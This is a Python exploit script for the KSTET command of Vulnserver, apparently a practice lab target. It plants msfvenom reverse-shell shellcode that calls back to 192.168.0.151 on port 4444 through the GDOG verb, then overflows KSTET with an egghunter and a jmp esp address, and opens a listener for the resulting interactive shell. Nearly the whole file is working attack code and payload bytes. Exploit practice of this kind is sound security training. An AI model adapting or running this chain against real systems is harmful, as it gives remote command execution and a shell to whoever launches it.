#!/usr/bin/env python3
#
# Vulnserver: KSTET
# * pwntools
# * metasploit reverse_tcp payload
# * Ropper

# Warning: it does not crash the server, but thread dies and second attempt
# to exploit will fail.

import sys
import pwn
from threading import Thread


# set target info
RHOST = '127.0.0.1'
RPORT = 9999
LPORT = 4444


def generate_payload1():
    """
    This method will put shellcode in the memory where it can be found via TAG
    """
    NOP = pwn.asm("nop")  # noqa: F841
    payload = ""

    # msfvenom -f python -v shellcode -p windows/shell_reverse_tcp LHOST=192.168.0.151 LPORT=4444 EXITFUNC=thread -e x86/alpha_upper # noqa: E501
    shellcode = ""
    shellcode += "\x89\xe2\xda\xd1\xd9\x72\xf4\x59\x49\x49\x49\x49"
    shellcode += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58"
    shellcode += "\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48"
    shellcode += "\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41"
    shellcode += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
    shellcode += "\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58\x4d\x52"
    shellcode += "\x33\x30\x33\x30\x53\x30\x43\x50\x4b\x39\x4a\x45"
    shellcode += "\x36\x51\x4f\x30\x45\x34\x4c\x4b\x50\x50\x30\x30"
    shellcode += "\x4c\x4b\x31\x42\x34\x4c\x4c\x4b\x51\x42\x45\x44"
    shellcode += "\x4c\x4b\x54\x32\x37\x58\x54\x4f\x38\x37\x31\x5a"
    shellcode += "\x46\x46\x56\x51\x4b\x4f\x4e\x4c\x47\x4c\x33\x51"
    shellcode += "\x43\x4c\x44\x42\x46\x4c\x51\x30\x59\x51\x58\x4f"
    shellcode += "\x44\x4d\x35\x51\x49\x57\x4b\x52\x4b\x42\x30\x52"
    shellcode += "\x51\x47\x4c\x4b\x51\x42\x34\x50\x4c\x4b\x30\x4a"
    shellcode += "\x57\x4c\x4c\x4b\x30\x4c\x52\x31\x54\x38\x5a\x43"
    shellcode += "\x37\x38\x33\x31\x4e\x31\x56\x31\x4c\x4b\x31\x49"
    shellcode += "\x47\x50\x45\x51\x4e\x33\x4c\x4b\x37\x39\x45\x48"
    shellcode += "\x4a\x43\x56\x5a\x30\x49\x4c\x4b\x30\x34\x4c\x4b"
    shellcode += "\x33\x31\x48\x56\x30\x31\x4b\x4f\x4e\x4c\x49\x51"
    shellcode += "\x48\x4f\x34\x4d\x55\x51\x58\x47\x46\x58\x4d\x30"
    shellcode += "\x54\x35\x5a\x56\x55\x53\x53\x4d\x4b\x48\x57\x4b"
    shellcode += "\x53\x4d\x37\x54\x34\x35\x4d\x34\x56\x38\x4c\x4b"
    shellcode += "\x56\x38\x36\x44\x35\x51\x48\x53\x32\x46\x4c\x4b"
    shellcode += "\x44\x4c\x30\x4b\x4c\x4b\x36\x38\x45\x4c\x35\x51"
    shellcode += "\x58\x53\x4c\x4b\x44\x44\x4c\x4b\x45\x51\x58\x50"
    shellcode += "\x4d\x59\x47\x34\x47\x54\x47\x54\x51\x4b\x51\x4b"
    shellcode += "\x35\x31\x46\x39\x30\x5a\x56\x31\x4b\x4f\x4d\x30"
    shellcode += "\x31\x4f\x51\x4f\x50\x5a\x4c\x4b\x42\x32\x4a\x4b"
    shellcode += "\x4c\x4d\x31\x4d\x53\x58\x37\x43\x57\x42\x43\x30"
    shellcode += "\x53\x30\x45\x38\x44\x37\x44\x33\x47\x42\x31\x4f"
    shellcode += "\x50\x54\x45\x38\x50\x4c\x42\x57\x37\x56\x44\x47"
    shellcode += "\x4b\x4f\x4e\x35\x38\x38\x4a\x30\x35\x51\x35\x50"
    shellcode += "\x33\x30\x57\x59\x58\x44\x31\x44\x46\x30\x32\x48"
    shellcode += "\x47\x59\x4d\x50\x42\x4b\x45\x50\x4b\x4f\x58\x55"
    shellcode += "\x56\x30\x46\x30\x30\x50\x46\x30\x57\x30\x30\x50"
    shellcode += "\x47\x30\x46\x30\x53\x58\x4b\x5a\x54\x4f\x49\x4f"
    shellcode += "\x4d\x30\x4b\x4f\x39\x45\x4d\x47\x43\x5a\x54\x45"
    shellcode += "\x43\x58\x4f\x30\x39\x38\x35\x50\x4a\x37\x53\x58"
    shellcode += "\x44\x42\x45\x50\x52\x31\x31\x4c\x4c\x49\x4b\x56"
    shellcode += "\x42\x4a\x34\x50\x56\x36\x30\x57\x35\x38\x4d\x49"
    shellcode += "\x4f\x55\x44\x34\x33\x51\x4b\x4f\x4e\x35\x4d\x55"
    shellcode += "\x4f\x30\x53\x44\x44\x4c\x4b\x4f\x30\x4e\x44\x48"
    shellcode += "\x34\x35\x5a\x4c\x42\x48\x5a\x50\x38\x35\x4f\x52"
    shellcode += "\x30\x56\x4b\x4f\x38\x55\x53\x58\x52\x43\x52\x4d"
    shellcode += "\x52\x44\x53\x30\x4c\x49\x5a\x43\x30\x57\x30\x57"
    shellcode += "\x36\x37\x30\x31\x5a\x56\x52\x4a\x52\x32\x46\x39"
    shellcode += "\x51\x46\x4a\x42\x4b\x4d\x43\x56\x59\x57\x51\x54"
    shellcode += "\x56\x44\x57\x4c\x33\x31\x43\x31\x4c\x4d\x30\x44"
    shellcode += "\x36\x44\x52\x30\x38\x46\x53\x30\x31\x54\x51\x44"
    shellcode += "\x50\x50\x50\x56\x46\x36\x31\x46\x47\x36\x46\x36"
    shellcode += "\x30\x4e\x56\x36\x31\x46\x30\x53\x46\x36\x53\x58"
    shellcode += "\x33\x49\x48\x4c\x57\x4f\x4b\x36\x4b\x4f\x39\x45"
    shellcode += "\x4b\x39\x4b\x50\x50\x4e\x51\x46\x30\x46\x4b\x4f"
    shellcode += "\x56\x50\x55\x38\x33\x38\x4c\x47\x55\x4d\x43\x50"
    shellcode += "\x4b\x4f\x38\x55\x4f\x4b\x4d\x30\x35\x4d\x37\x5a"
    shellcode += "\x34\x4a\x33\x58\x59\x36\x5a\x35\x4f\x4d\x4d\x4d"
    shellcode += "\x4b\x4f\x4e\x35\x57\x4c\x45\x56\x53\x4c\x34\x4a"
    shellcode += "\x4d\x50\x4b\x4b\x4b\x50\x32\x55\x45\x55\x4f\x4b"
    shellcode += "\x47\x37\x52\x33\x43\x42\x32\x4f\x33\x5a\x45\x50"
    shellcode += "\x46\x33\x4b\x4f\x4e\x35\x41\x41"

    payload += "Y0LOY0LO"[::-1]  # egg tag
    payload += shellcode

    # the GDOG verb will leave string in the memory
    # other verbs may erase the egg before the egghunt kicks
    # it also has no badchars to worry about
    return "GDOG {}\r\n".format(payload)


def generate_payload2():
    NOP = pwn.asm("nop")  # noqa: F841
    payload = ""

    # egghunter for Y0LOY0LO tag.
    egghunter = ""
    egghunter += "\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x5a"
    egghunter += "\x3c\x05\x74\xef\xb8\x4f\x4c\x30\x59\x89\xd7\xaf\x75\xea\xaf"
    egghunter += "\x75\xe7\x89\xf8\xff\xe0"

    payload += egghunter
    payload += NOP * (70 - len(payload))
    payload += pwn.p32(0x625011f7)  # jmp esp
    payload += pwn.asm("add eax, 6; jmp eax")  # esp points here

    return "KSTET {}\r\n".format(payload)


def attack():
    r = pwn.remote(RHOST, RPORT, typ="tcp")
    r.send(generate_payload1())
    r.send(generate_payload2())


if __name__ == "__main__":
    if len(sys.argv) > 1:
        RHOST = sys.argv[1]

    thread = Thread(target=attack)
    thread.start()

    listener = pwn.listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()
